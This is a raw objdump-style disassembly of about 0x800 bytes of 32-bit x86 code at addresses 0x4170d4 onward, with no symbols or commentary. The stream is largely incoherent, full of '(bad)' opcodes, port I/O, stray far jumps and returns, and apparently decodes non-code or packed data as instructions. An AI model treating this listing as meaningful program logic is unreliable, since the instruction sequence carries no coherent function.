  4170d4:	lahf   
  4170d5:	mov    ebx,0x2ce5385a
  4170da:	push   cs
  4170db:	push   es
  4170dc:	cli    
  4170dd:	aam    0x54
  4170df:	test   al,0xf1
  4170e1:	pop    ebp
  4170e2:	adc    bl,BYTE PTR [eax+0x34c65212]
  4170e8:	aaa    
  4170e9:	mov    ebx,0x4c4afe4a
  4170ee:	hlt    
  4170ef:	jnp    0x4170e2
  4170f1:	stos   DWORD PTR es:[edi],eax
  4170f2:	xor    DWORD PTR [esp+ecx*8-0x5f],edi
  4170f6:	adc    ebp,edi
  4170f8:	sub    esi,0x5df6f9ac
  4170fe:	retf   0x36b9
  417101:	ret    
  417102:	mov    bh,0x1e
  417104:	in     al,0x4e
  417106:	pushf  
  417107:	or     al,0x11
  417109:	cli    
  41710a:	jmp    0x41709a
  41710c:	adc    eax,0x4f1c2438
  417111:	sub    eax,0x92186dad
  417116:	mov    BYTE PTR [ebp+0x3f],ch
  417119:	mov    al,ds:0xfd57dbc0
  41711e:	out    0x95,al
  417120:	xchg   BYTE PTR [ecx],dh
  417122:	les    eax,FWORD PTR [edx+0x11051dcd]
  417128:	push   0x9b053ee1
  41712d:	jmp    0xfa0d:0x4690db62
  417134:	ficomp DWORD PTR ds:0x10236975
  41713a:	inc    ecx
  41713b:	fisub  DWORD PTR [ecx]
  41713d:	xor    bl,BYTE PTR [ecx+0x6f]
  417140:	xor    eax,0x373e0944
  417145:	jle    0x417183
  417147:	inc    eax
  417148:	dec    ax
  41714a:	push   edi
  41714b:	push   eax
  41714c:	pop    ebx
  41714d:	xchg   ebp,eax
  41714e:	add    BYTE PTR [eax],al
  417150:	in     al,0xa3
  417152:	rcr    esp,1
  417154:	inc    ebx
  417155:	loopne 0x4171b3
  417157:	fcomp  st(6)
  417159:	and    bh,0x89
  41715c:	lahf   
  41715d:	(bad)  
  41715e:	lods   eax,DWORD PTR ds:[esi]
  41715f:	popa   
  417160:	mov    edi,DWORD PTR [esi-0x47]
  417163:	dec    esp
  417164:	popf   
  417165:	sbb    DWORD PTR [ebp+eax*2+0x73fd53b1],0x8
  41716d:	sub    BYTE PTR [bx+si],ah
  417170:	cmp    ecx,eax
  417172:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417173:	xchg   DWORD PTR [esi],esp
  417175:	xor    eax,0x579f95a0
  41717a:	inc    ecx
  41717b:	div    esp
  41717d:	in     al,0xd4
  41717f:	scas   eax,DWORD PTR es:[edi]
  417180:	aas    
  417181:	daa    
  417182:	push   edx
  417183:	out    dx,al
  417184:	pop    esp
  417185:	fldenv [edx]
  417187:	dec    eax
  417188:	jmp    0x417166
  41718a:	jmp    0x174dd39c
  41718f:	pop    eax
  417190:	and    DWORD PTR [eax+0x1ef60ba5],edx
  417196:	mov    ebx,0x75e52d0e
  41719b:	aam    0x20
  41719d:	ret    
  41719e:	pop    eax
  41719f:	inc    edx
  4171a0:	data16 and BYTE PTR [esi],0xfc
  4171a4:	xor    al,0xd4
  4171a6:	lea    esp,[ecx+0x12]
  4171a9:	sub    bl,BYTE PTR [ebp+ebp*4+0x358991bc]
  4171b0:	ficom  DWORD PTR [edx-0x38]
  4171b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171b4:	ret    
  4171b5:	mov    bh,0x76
  4171b7:	fidivr DWORD PTR [edi-0x2e]
  4171ba:	sub    al,BYTE PTR [eax+0x42fa789a]
  4171c0:	sbb    dl,BYTE PTR [ecx-0x3956b38a]
  4171c6:	in     eax,dx
  4171c7:	jmp    0x3e29:0xbd21f7bb
  4171ce:	mov    al,0x80
  4171d0:	das    
  4171d1:	jbe    0x41719f
  4171d3:	mov    dl,0x68
  4171d5:	jmp    0xe27a:0xae197399
  4171dc:	aad    0x9f
  4171de:	mov    ds:0xc49b22d4,eax
  4171e3:	xor    BYTE PTR [ecx-0x57],ch
  4171e6:	dec    edx
  4171e7:	out    0x1e,al
  4171e9:	dec    eax
  4171ea:	fucomp st(6)
  4171ec:	rcr    DWORD PTR [ecx-0x65f89393],cl
  4171f2:	dec    edx
  4171f3:	scas   eax,DWORD PTR es:[edi]
  4171f4:	mov    ebp,0xda3f4041
  4171f9:	popa   
  4171fa:	mov    ecx,0x5a7d41b5
  4171ff:	aam    0x47
  417201:	and    BYTE PTR [ebx-0x36faf788],0x97
  417208:	cmc    
  417209:	inc    esp
  41720a:	cmp    DWORD PTR [ecx],0xffffffae
  41720d:	cmp    edx,DWORD PTR [eax+edx*8]
  417210:	cmp    DWORD PTR [edx+edx*2],esp
  417213:	jnp    0x417277
  417215:	jno    0x417205
  417217:	nop
  417218:	cmp    esp,0xffffffbb
  41721b:	sub    al,BYTE PTR [esi-0x55]
  41721e:	cli    
  41721f:	out    0x5b,al
  417221:	adc    eax,0x72ee3fac
  417226:	ret    
  417227:	nop
  417228:	cmp    edx,DWORD PTR [edi]
  41722a:	shr    DWORD PTR [edx],0x9c
  41722d:	cmp    esp,DWORD PTR [edx+edi*2]
  417230:	lock fnstcw WORD PTR [bx+si+0x710d]
  417236:	cmp    DWORD PTR [edx+0x2899d255],eax
  41723c:	xchg   ebx,eax
  41723d:	(bad)  
  41723e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41723f:	xor    ebp,esi
  417241:	dec    esi
  417242:	(bad)  
  417243:	jnp    0x4172a5
  417245:	fdiv   st,st(2)
  417247:	pmuludq mm0,QWORD PTR [ebx-0x19]
  41724b:	fs inc edx
  41724d:	xchg   esp,eax
  41724e:	fld    st(3)
  417250:	mov    edi,edi
  417252:	jbe    0x4172c1
  417254:	cmp    eax,0x237c6304
  417259:	loop   0x41728e
  41725b:	jle    0x4171e3
  41725d:	fsub   DWORD PTR [esi]
  41725f:	cmp    eax,0xfcd2372e
  417264:	cmovl  ebx,DWORD PTR [eax+ebp*1]
  417268:	pop    eax
  417269:	xor    dh,BYTE PTR [ebx-0x37]
  41726c:	inc    ebp
  41726d:	int3   
  41726e:	mov    al,0x70
  417270:	sar    DWORD PTR [edi+0x1e2687d0],0x28
  417277:	adc    esi,DWORD PTR [edx+esi*4+0x31]
  41727b:	out    dx,al
  41727c:	mov    al,ds:0xad83f576
  417281:	cmp    ch,bl
  417283:	jbe    0x4172e4
  417285:	mov    WORD PTR [esi-0x58],es
  417288:	in     eax,0x6
  41728a:	push   ss
  41728b:	cs test al,0xc
  41728e:	xchg   ebp,eax
  41728f:	xchg   esi,eax
  417290:	sti    
  417291:	adc    cl,BYTE PTR [edx+0x2ce99447]
  417297:	jle    0x4172d7
  417299:	dec    edi
  41729a:	fisub  WORD PTR [ebx]
  41729c:	daa    
  41729d:	pop    ss
  41729e:	sub    al,0xed
  4172a0:	call   0xdffe897a
  4172a5:	iret   
  4172a6:	or     al,0x6e
  4172a8:	(bad)  
  4172a9:	clc    
  4172aa:	stc    
  4172ab:	xchg   DWORD PTR [edi],ebx
  4172ad:	(bad)
  4172b1:	mul    DWORD PTR [ebx+ebp*1+0x46]
  4172b5:	rcr    esp,0xb0
  4172b8:	pusha  
  4172b9:	repnz jecxz 0x417281
  4172bc:	jecxz  0x41729e
  4172be:	mov    ebp,0xccacc836
  4172c3:	push   cs
  4172c4:	xchg   edi,eax
  4172c5:	mov    ebx,0x6eb7e09e
  4172ca:	pop    ebp
  4172cb:	sbb    dh,0xbd
  4172ce:	ss mov esi,0xb7f194cc
  4172d4:	int3   
  4172d5:	(bad)  [ecx-0x26]
  4172d8:	ds je  0x417265
  4172db:	dec    ebp
  4172dc:	scas   eax,DWORD PTR es:[edi]
  4172dd:	pushf  
  4172de:	jno    0x4172ed
  4172e0:	aad    0x33
  4172e2:	cli    
  4172e3:	(bad)  
  4172e4:	rcr    BYTE PTR [ecx+eiz*4+0x5f],cl
  4172e8:	mov    ah,0xdf
  4172ea:	add    eax,DWORD PTR [edi+0x7cc1d711]
  4172f0:	mov    eax,0x885c16a0
  4172f5:	push   ebx
  4172f6:	call   0xb76d76a3
  4172fb:	push   ebp
  4172fc:	and    ch,al
  4172fe:	(bad)  
  4172ff:	lds    edx,FWORD PTR [eax-0x3b196ddf]
  417305:	shl    al,cl
  417307:	pop    edi
  417308:	stc    
  417309:	xchg   ebp,eax
  41730a:	out    0xfd,al
  41730c:	cwde   
  41730d:	pop    ebx
  41730e:	test   eax,0x4bdc04e1
  417313:	mov    al,0x4e
  417315:	nop
  417316:	fimul  WORD PTR [esi-0x6f]
  417319:	test   BYTE PTR [edi+0x76],dh
  41731c:	das    
  41731d:	aas    
  41731e:	shl    DWORD PTR ds:0x5385d250,0xe8
  417325:	push   es
  417326:	nop
  417327:	inc    edx
  417328:	adc    bh,dl
  41732a:	mov    dh,0x7c
  41732c:	in     eax,dx
  41732d:	addr16 push 0xf5bca6da
  417333:	jmp    0x417309
  417335:	sbb    eax,0xa2f2b632
  41733a:	mov    al,0xca
  41733c:	push   eax
  41733d:	adc    al,al
  41733f:	jnp    0x417374
  417341:	or     DWORD PTR [edi+eax*4+0x150f094a],ebp
  417348:	or     DWORD PTR [ecx-0x16044d78],esp
  41734e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41734f:	cli    
  417350:	sbb    edi,ecx
  417352:	or     eax,0x86d00b46
  417357:	pop    esp
  417358:	mov    cl,0xba
  41735a:	and    ebp,DWORD PTR [ecx]
  41735c:	int3   
  41735d:	out    dx,al
  41735e:	mov    eax,ds:0x5ccd2590
  417363:	push   esi
  417364:	sub    dh,BYTE PTR [esi-0x32bac58c]
  41736a:	jle    0x417326
  41736c:	rol    BYTE PTR [eax],0x23
  41736f:	xor    al,0x54
  417371:	aam    0xb8
  417373:	xchg   esp,eax
  417374:	pop    ss
  417375:	xchg   esp,eax
  417376:	xchg   edi,eax
  417377:	xor    eax,0x1c30d289
  41737c:	ficom  DWORD PTR [ebp+0xa]
  41737f:	fwait
  417380:	imul   esi,esp,0xffffffe8
  417383:	in     eax,0x8a
  417385:	daa    
  417386:	cld    
  417387:	mov    dl,0xb
  417389:	or     al,BYTE PTR [ebp+0x77]
  41738c:	xor    ebp,DWORD PTR [ebp+0x1f]
  41738f:	inc    esp
  417390:	test   al,0xaa
  417392:	lea    eax,[edx+0x3c85c639]
  417398:	mov    BYTE PTR [ecx+esi*2+0x54],ah
  41739c:	stos   BYTE PTR es:[edi],al
  41739d:	xchg   esi,esp
  41739f:	inc    edx
  4173a0:	pop    edx
  4173a1:	mov    ds:0xe682000e,al
  4173a6:	inc    edx
  4173a7:	jl     0x417342
  4173a9:	imul   ecx,DWORD PTR [edi+esi*1+0x73],0x5a
  4173ae:	sar    BYTE PTR [esi+0x28],1
  4173b1:	xor    eax,0xee0849a1
  4173b6:	add    BYTE PTR es:[ebx+0x3c08e63d],ch
  4173bd:	adc    edx,DWORD PTR [esi-0x7f10c01d]
  4173c3:	je     0x417380
  4173c5:	loopne 0x4173fa
  4173c7:	loop   0x41737d
  4173c9:	cli    
  4173ca:	and    al,0x88
  4173cc:	xor    eax,0xa35b35ea
  4173d1:	xchg   esi,eax
  4173d2:	xlat   BYTE PTR ds:[ebx]
  4173d3:	dec    ebx
  4173d4:	fidivr WORD PTR [ebx-0x3]
  4173d7:	sbb    eax,0x990a0a8a
  4173dc:	lea    edx,[ecx-0xd]
  4173df:	jb     0x4173d0
  4173e1:	xchg   DWORD PTR [edx],edx
  4173e3:	jb     0x4173f9
  4173e5:	addr16 push esp
  4173e7:	retf   
  4173e8:	xchg   DWORD PTR [ebx+0x69f42967],esi
  4173ee:	test   BYTE PTR [ebx+edi*8+0x434cb9f0],dh
  4173f5:	shr    ah,0xd0
  4173f8:	pushf  
  4173f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173fa:	or     ah,BYTE PTR [eax-0x76]
  4173fd:	bound  edi,QWORD PTR [ebp-0x39]
  417400:	push   ss
  417401:	push   0x7f
  417403:	je     0x417463
  417405:	fidiv  WORD PTR [ebx]
  417407:	jecxz  0x4173f9
  417409:	pop    esi
  41740a:	mov    ebx,0x96b875cb
  41740f:	mov    esp,0xe1cc6034
  417414:	loop   0x41746d
  417416:	fcomp  QWORD PTR [edi+0x37bd7c96]
  41741c:	adc    bh,BYTE PTR [edi+0x23]
  41741f:	data16 (bad) 
  417421:	sti    
  417422:	or     al,0xfa
  417424:	sti    
  417425:	dec    esi
  417426:	clc    
  417427:	push   ds
  417428:	cmp    BYTE PTR [ecx],dh
  41742a:	nop
  41742b:	sbb    eax,0x30506e63
  417430:	div    DWORD PTR [ebp+0x48]
  417433:	and    eax,0xfd95272
  417438:	cmp    cl,BYTE PTR [ecx]
  41743a:	mov    fs,WORD PTR [eax+0x228e853d]
  417440:	das    
  417441:	dec    esi
  417442:	adc    al,0x76
  417444:	and    al,0x9e
  417446:	stos   DWORD PTR es:[edi],eax
  417447:	stc    
  417448:	jp     0x4174bb
  41744a:	sbb    al,0xd5
  41744c:	out    dx,al
  41744d:	jp     0x417438
  41744f:	data16 shl BYTE PTR ds:0x2592b42f,0xac
  417457:	dec    ebx
  417458:	jne    0x417493
  41745a:	(bad)  
  41745b:	dec    edi
  41745c:	jmp    0xaef6:0x6f9bd77d
  417463:	fucomip st,st(5)
  417465:	sbb    al,0xcd
  417467:	inc    edi
  417468:	jb     0x417411
  41746a:	pushf  
  41746b:	fs leave 
  41746d:	imul   edx,ebp,0xe9bd491
  417473:	jb     0x41745e
  417475:	cmc    
  417476:	fstp   QWORD PTR [edi+0x4f670ac2]
  41747c:	xor    dh,BYTE PTR [eax+0x64]
  41747f:	(bad)  
  417480:	adc    edi,DWORD PTR [ecx]
  417482:	pop    eax
  417483:	aad    0xa3
  417485:	add    esp,DWORD PTR [eax-0x73]
  417488:	in     al,0x22
  41748a:	(bad)  
  41748b:	in     al,dx
  41748c:	mov    ecx,esi
  41748e:	sub    BYTE PTR [edi-0x33],bh
  417491:	int    0xd4
  417493:	jg     0x41746c
  417495:	in     al,0x2f
  417497:	jnp    0xfe8274eb
  41749d:	scas   al,BYTE PTR es:[edi]
  41749e:	and    ah,ah
  4174a0:	in     eax,dx
  4174a1:	cmc    
  4174a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174a3:	int    0xe9
  4174a5:	jecxz  0x417443
  4174a7:	shl    DWORD PTR [eax-0x20d2e9b3],cl
  4174ad:	and    edx,DWORD PTR [edi+0x64af1463]
  4174b3:	pop    ss
  4174b4:	loope  0x417502
  4174b6:	sbb    DWORD PTR [edx-0x72a6c040],eax
  4174bc:	cmp    ch,BYTE PTR [ecx-0x53627699]
  4174c2:	ret    
  4174c3:	icebp  
  4174c4:	pop    ss
  4174c5:	lea    ebp,ds:0x6e31ea18
  4174cb:	stos   BYTE PTR es:[edi],al
  4174cc:	push   ds
  4174cd:	ins    DWORD PTR es:[edi],dx
  4174ce:	outs   dx,BYTE PTR ds:[esi]
  4174cf:	xorps  xmm2,xmm5
  4174d2:	leave  
  4174d3:	ror    DWORD PTR [eax],0x6d
  4174d6:	dec    ebp
  4174d7:	in     eax,0x95
  4174d9:	cs push eax
  4174db:	cs mov dl,0x42
  4174de:	cmp    bh,BYTE PTR [eax-0x7]
  4174e1:	or     DWORD PTR [edi+0x1],0x5770623c
  4174e8:	sub    al,0x96
  4174ea:	icebp  
  4174eb:	fwait
  4174ec:	stos   DWORD PTR es:[edi],eax
  4174ed:	in     al,dx
  4174ee:	mul    BYTE PTR [edi+ebp*8]
  4174f1:	repz mov edx,0x7fa7eca0
  4174f7:	fwait
  4174f8:	mov    al,ds:0xc9610c0a
  4174fd:	mov    al,cl
  4174ff:	jge    0x417515
  417501:	shl    DWORD PTR [ebp+0x45],cl
  417504:	hlt    
  417505:	push   ebx
  417506:	in     eax,dx
  417507:	imul   esi,DWORD PTR [esi],0xaa6cfc7d
  41750d:	push   cs
  41750e:	out    dx,al
  41750f:	pop    ebp
  417510:	mov    eax,ds:0x323ae596
  417515:	out    dx,al
  417516:	or     BYTE PTR [ecx-0x56d74605],cl
  41751c:	jmp    DWORD PTR [edx+0x61879dfb]
  417522:	push   es
  417523:	leave  
  417524:	cwde   
  417525:	pop    esi
  417526:	or     bh,BYTE PTR [edx]
  417528:	stos   BYTE PTR es:[edi],al
  417529:	call   0x7372622d
  41752e:	popa   
  41752f:	stos   DWORD PTR es:[edi],eax
  417530:	push   0xffffff9c
  417532:	sbb    DWORD PTR [ecx-0xa],esi
  417535:	test   eax,0x8275bc3c
  41753a:	jmp    0xc1e1876a
  41753f:	sbb    BYTE PTR [edi+0x36],bl
  417542:	retf   0xc55c
  417545:	xor    esi,DWORD PTR ds:0x794fe438
  41754b:	xchg   esi,eax
  41754c:	mov    esi,edx
  41754e:	rol    BYTE PTR [esi+0x506cf755],0x8d
  417555:	cdq    
  417556:	(bad)  
  417557:	enter  0x6203,0x6c
  41755b:	in     al,dx
  41755c:	add    eax,0x87504c66
  417561:	rcl    BYTE PTR [edx+0x77],0xf6
  417565:	daa    
  417566:	mov    ecx,0xe4497d0d
  41756b:	xchg   eax,ebx
  41756d:	jecxz  0x417515
  41756f:	jecxz  0x417588
  417571:	and    al,0x85
  417573:	out    0x7b,al
  417575:	stos   BYTE PTR es:[edi],al
  417576:	push   ecx
  417577:	in     eax,0xa3
  417579:	mov    ah,0x79
  41757b:	sar    DWORD PTR [ebx+0x2e],cl
  41757e:	xchg   esp,eax
  41757f:	fwait
  417580:	inc    eax
  417581:	jae    0x41750f
  417583:	dec    ecx
  417584:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417585:	jle    0x417565
  417587:	bound  esi,QWORD PTR [eax-0x51cd1f29]
  41758d:	sbb    al,0xcc
  41758f:	in     al,0xe0
  417591:	fiadd  DWORD PTR [ecx]
  417593:	ds push ds
  417595:	push   es
  417596:	mov    bh,0xc8
  417598:	dec    ecx
  417599:	mov    ebp,DWORD PTR [edx+ebp*2]
  41759c:	daa    
  41759d:	or     DWORD PTR [ebx],edx
  41759f:	lock gs mov esp,0xcca5a701
  4175a6:	dec    eax
  4175a7:	inc    esp
  4175a8:	add    al,0xb
  4175aa:	fdiv   QWORD PTR [eax-0x5e]
  4175ad:	mov    al,0xdb
  4175af:	sub    DWORD PTR [eax],ebp
  4175b1:	cld    
  4175b2:	push   0xffffff9b
  4175b4:	sbb    ch,bl
  4175b6:	push   ss
  4175b7:	les    ecx,FWORD PTR [esi+0xe]
  4175ba:	rcr    DWORD PTR [edi],cl
  4175bc:	xor    eax,0x64b96714
  4175c1:	daa    
  4175c2:	fld    QWORD PTR [edi+0x30]
  4175c5:	into   
  4175c6:	jae    0x417635
  4175c8:	sbb    al,0x5a
  4175ca:	mov    cl,0x9b
  4175cc:	lds    esi,FWORD PTR [esi+edi*8-0x3e]
  4175d0:	test   DWORD PTR [edx+0x4e5d5e96],edx
  4175d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175d7:	mov    DWORD PTR [ecx+0x12],0x963fb677
  4175de:	movntq (bad),mm2
  4175df:	out    0xd7,eax
  4175e1:	sub    dl,BYTE PTR [edi-0x1588749]
  4175e7:	mov    ds:0xdae0ddbc,al
  4175ec:	in     al,dx
  4175ed:	sahf   
  4175ee:	pop    es
  4175ef:	or     cl,BYTE PTR [eax+0x547f6f59]
  4175f5:	mov    ah,0xa9
  4175f7:	mov    DWORD PTR [ebx+ebx*1],esi
  4175fa:	lds    ebx,FWORD PTR [esi-0x23a90646]
  417600:	ret    
  417601:	or     DWORD PTR [edx-0x24],0x1ab80054
  417608:	or     ah,0x9a
  41760b:	lods   al,BYTE PTR ds:[esi]
  41760c:	jge    0x417652
  41760e:	les    eax,FWORD PTR [edi+0x4d]
  417611:	xor    eax,DWORD PTR [edi]
  417613:	pushf  
  417614:	cmp    BYTE PTR [eax+0x6a3a8fe6],0x23
  41761b:	pusha  
  41761c:	or     DWORD PTR [eax-0x42],eax
  41761f:	rol    BYTE PTR [edx+0x3956ecdc],0xa3
  417626:	mov    WORD PTR [esi+0x27],cs
  417629:	int    0x6d
  41762b:	pushf  
  41762c:	jmp    0x16a0bbee
  417631:	xor    esp,DWORD PTR [edi+0x58]
  417634:	pusha  
  417635:	jno    0x417667
  417637:	into   
  417638:	jns    0x4176a1
  41763a:	test   eax,0x4bbe1573
  41763f:	cmp    edx,DWORD PTR [edx+0x13]
  417642:	arpl   WORD PTR ds:0xab9fc21f,bp
  417648:	sub    DWORD PTR [esi+edi*4],ebx
  41764b:	popf   
  41764c:	mov    ebx,?
  41764e:	mov    ch,al
  417650:	mov    dl,0x7a
  417652:	clc    
  417653:	mov    ss,WORD PTR [ecx+0x7b]
  417656:	leave  
  417657:	pop    ebx
  417658:	mov    ecx,0x37bac2a2
  41765d:	jbe    0x417648
  41765f:	or     BYTE PTR [edx],0xab
  417662:	leave  
  417663:	inc    esi
  417664:	dec    edx
  417665:	pushf  
  417666:	popf   
  417667:	sbb    dh,BYTE PTR [eax]
  417669:	cmp    bl,BYTE PTR [ebx]
  41766b:	xor    BYTE PTR [eax+0x464fe7a8],ch
  417671:	and    al,0xcb
  417673:	in     al,0x93
  417675:	push   0xffffffd1
  417677:	in     eax,dx
  417678:	xchg   ecx,eax
  417679:	cmova  esi,DWORD PTR [ebx+ebx*2]
  41767d:	mov    bl,0xae
  41767f:	xchg   esi,eax
  417680:	shl    DWORD PTR [edx],cl
  417682:	scas   al,BYTE PTR es:[edi]
  417683:	add    eax,0x59555bee
  417688:	ins    DWORD PTR es:[edi],dx
  417689:	or     eax,0x4b5f4de9
  41768e:	xor    eax,0x26f44112
  417693:	add    BYTE PTR [edi],dh
  417695:	sbb    al,0xdd
  417697:	loopne 0x417692
  417699:	sub    ch,BYTE PTR [ebp+0x61]
  41769c:	dec    edi
  41769d:	mov    eax,0xf3a84cbf
  4176a2:	dec    edx
  4176a3:	jns    0x417644
  4176a5:	std    
  4176a6:	les    edi,FWORD PTR [edi-0x26]
  4176a9:	imul   eax,eax,0xffffff9d
  4176ac:	mov    esi,0xe3d3c035
  4176b1:	mov    edx,0x9e57701e
  4176b6:	sbb    eax,0x6777ccb
  4176bb:	stc    
  4176bc:	mov    eax,ds:0x5548ed64
  4176c1:	daa    
  4176c2:	addr16 xor edx,edi
  4176c5:	sahf   
  4176c6:	jbe    0x417706
  4176c8:	mov    edx,0xf6320d66
  4176cd:	pop    ebx
  4176ce:	mov    edx,0xb2e470ec
  4176d3:	xlat   BYTE PTR ds:[ebx]
  4176d4:	cmp    al,bh
  4176d6:	sbb    DWORD PTR [edi],0xb075a806
  4176dc:	rcl    edx,cl
  4176de:	fs mov ebp,0xfec0f5c3
  4176e4:	inc    ebp
  4176e5:	in     eax,0x62
  4176e7:	into   
  4176e8:	fisub  WORD PTR [esi+0x1462ac65]
  4176ee:	mov    bh,0xcc
  4176f0:	fld    st(6)
  4176f2:	sub    BYTE PTR [edx],ch
  4176f4:	mov    ebx,0xcaf18b9d
  4176f9:	(bad)  
  4176fa:	ficom  DWORD PTR [edi+edi*8]
  4176fd:	jb     0x4176f8
  4176ff:	in     eax,0x9b
  417701:	gs aad 0x73
  417704:	and    DWORD PTR [edi+0x21],edi
  417707:	retf   0x2719
  41770a:	jbe    0x417741
  41770c:	jle    0x4176c6
  41770e:	jecxz  0x417772
  417710:	test   ah,al
  417712:	dec    ecx
  417713:	sti    
  417714:	shl    ebx,cl
  417716:	pusha  
  417717:	pop    eax
  417718:	mov    ch,0x7f
  41771a:	dec    ecx
  41771b:	dec    esi
  41771c:	pop    eax
  41771d:	pusha  
  41771e:	js     0x417776
  417720:	add    ebx,ebx
  417722:	cmp    ebx,DWORD PTR [edx]
  417724:	sti    
  417725:	xor    eax,DWORD PTR ds:0xbc7a22f9
  41772b:	popa   
  41772c:	rcr    BYTE PTR ds:0x111fd562,0xc4
  417733:	and    al,0x1a
  417735:	or     eax,0x2c235ced
  41773a:	xchg   ebp,ebx
  41773c:	aad    0xe
  41773e:	test   eax,0xbf4ad3cc
  417743:	sub    cl,bh
  417745:	sub    al,BYTE PTR [edi-0xf]
  417748:	xchg   edi,eax
  417749:	mov    ebp,0x924c0dc2
  41774e:	mov    edi,0x5a171221
  417753:	dec    esi
  417754:	ror    DWORD PTR [eax+eax*4],0x3e
  417758:	div    BYTE PTR [edx-0x35bdf531]
  41775e:	(bad)  
  41775f:	xchg   esi,eax
  417760:	fild   DWORD PTR [ecx-0x3b78ec23]
  417766:	and    ch,bh
  417768:	cld    
  417769:	and    BYTE PTR [ebx],cl
  41776b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41776c:	inc    esp
  41776d:	dec    edi
  41776e:	pop    ebp
  41776f:	mov    DWORD PTR [ebp+esi*2+0x4c73e5e1],ebp
  417776:	mov    edi,0x39b13e47
  41777b:	into   
  41777c:	jo     0x4177c0
  41777e:	pop    ebp
  41777f:	pop    esp
  417780:	xlat   BYTE PTR ds:[ebx]
  417781:	test   eax,0x5b9cb5c7
  417786:	pop    eax
  417787:	fild   QWORD PTR [edi-0x7f368f3c]
  41778d:	mov    BYTE PTR [ebx+0x78],ch
  417790:	bndstx [edi+0x40],bnd2
  417794:	xchg   esi,eax
  417795:	iret   
  417796:	mov    edx,0x20f65f25
  41779b:	adc    eax,0xdfdc85dc
  4177a0:	ret    0xc6ec
  4177a3:	ret    0xaa6d
  4177a6:	fadd   DWORD PTR [ecx+0x5e]
  4177a9:	pusha  
  4177aa:	repz adc al,dl
  4177ad:	in     eax,0x23
  4177af:	mov    ah,BYTE PTR [esi]
  4177b1:	xchg   esi,eax
  4177b2:	sub    BYTE PTR ds:0x30567821,0xa
  4177b9:	lds    edx,FWORD PTR [ecx-0x6f208a5e]
  4177bf:	cmc    
  4177c0:	call   0x36839730
  4177c5:	in     eax,0xab
  4177c7:	xor    al,0xd7
  4177c9:	cdq    
  4177ca:	xchg   edx,eax
  4177cb:	lock cs jge 0x4177cd
  4177cf:	sbb    DWORD PTR [eax],0x133d6f84
  4177d5:	push   edx
  4177d6:	xor    BYTE PTR [ebx-0x78],al
  4177d9:	xchg   edx,eax
  4177da:	dec    ebx
  4177db:	dec    ecx
  4177dc:	pop    ds
  4177dd:	cmp    al,0xb3
  4177df:	les    edx,FWORD PTR [edx]
  4177e1:	dec    edx
  4177e2:	or     bl,0x1d
  4177e5:	fdivr  DWORD PTR [edi+0x48b0bacc]
  4177eb:	push   0x9d16aa32
  4177f0:	pop    esp
  4177f1:	arpl   WORD PTR [esi+0x2a4c9d09],bx
  4177f7:	cld    
  4177f8:	push   ss
  4177f9:	push   edx
  4177fa:	fistp  QWORD PTR ds:0x33bfabc0
  417800:	mov    ch,0xdd
  417802:	mov    esp,0xd89e1760
  417807:	add    ecx,edi
  417809:	jns    0x4177a9
  41780b:	sbb    bl,BYTE PTR [ebp-0x5673d7dc]
  417811:	xor    eax,0xd8d2a589
  417816:	cmc    
  417817:	inc    edx
  417818:	pop    edx
  417819:	mov    cx,0xec9e
  41781d:	pop    eax
  41781e:	je     0x4177a3
  417820:	dec    edx
  417821:	in     eax,dx
  417822:	and    cl,BYTE PTR [esi-0x9]
  417825:	mov    ebp,0xda98e44e
  41782a:	pop    edx
  41782b:	xchg   esp,eax
  41782c:	in     al,dx
  41782d:	mov    edx,0xcbd49411
  417832:	scas   eax,DWORD PTR es:[edi]
  417833:	bnd jns 0x417840
  417836:	xchg   ebx,eax
  417837:	jbe    0x4177fa
  417839:	or     al,BYTE PTR [ecx]
  41783b:	in     al,dx
  41783c:	push   esp
  41783d:	bound  ecx,QWORD PTR [ecx*8-0x68399df0]
  417844:	sub    eax,0x3f3c1d72
  417849:	xor    ebp,DWORD PTR [ecx]
  41784b:	lods   al,BYTE PTR ds:[esi]
  41784c:	loop   0x4177d3
  41784e:	or     al,0x3f
  417850:	mov    edi,0xcd595b3b
  417855:	loop   0x41789a
  417857:	sub    DWORD PTR [edx+eax*1+0x45a7e24b],0xda377604
  417862:	push   es
  417863:	sub    al,bh
  417865:	sub    al,0x98
  417867:	adc    ah,BYTE PTR [ebp+0x23]
  41786a:	add    ebp,DWORD PTR [ecx+0x1803363f]
  417870:	jle    0x41780d
  417872:	loop   0x4178ef
  417874:	les    edi,FWORD PTR [eax-0xe]
  417877:	fist   DWORD PTR ds:0x12c06cf7
  41787d:	dec    esp
  41787e:	mov    ecx,0xcc10e3ed
  417883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417884:	push   ecx
  417885:	add    edx,DWORD PTR [edx-0x7cc80bb8]
  41788b:	jg     0x4178af
  41788d:	mov    al,0x9
  41788f:	pop    ebp
  417890:	ins    DWORD PTR es:[edi],dx
  417891:	adc    DWORD PTR [esi],0x533f398
  417897:	adc    eax,0xe1cc6299
  41789c:	sbb    ebx,ecx
  41789e:	lock jecxz 0x417886
  4178a1:	fld    TBYTE PTR [ecx]
  4178a3:	jo     0x4178b9
  4178a5:	stos   DWORD PTR es:[edi],eax
  4178a6:	imul   ebx,DWORD PTR [ebx-0x76],0x4c
  4178aa:	mov    cl,0x64
  4178ac:	cdq    
  4178ad:	or     ch,BYTE PTR [ebp-0x37]
  4178b0:	cmp    al,BYTE PTR [ebx-0x76]
  4178b3:	push   edx
  4178b4:	cli    
  4178b5:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178b7:	pop    ss
  4178b8:	mov    al,0xfa
  4178ba:	les    edx,FWORD PTR [ecx-0x7189a691]
  4178c0:	test   ebp,esi
  4178c2:	push   ds
  4178c3:	out    0xac,eax
  4178c5:	adc    al,0xfe
  4178c7:	pop    esi
  4178c8:	jb     0x41787a
  4178ca:	push   edx
  4178cb:	and    BYTE PTR [eax+0x25],ch
  4178ce:	inc    esp
  4178cf:	(bad)  
  4178d0:	pop    ebx
  4178d1:	dec    ebx
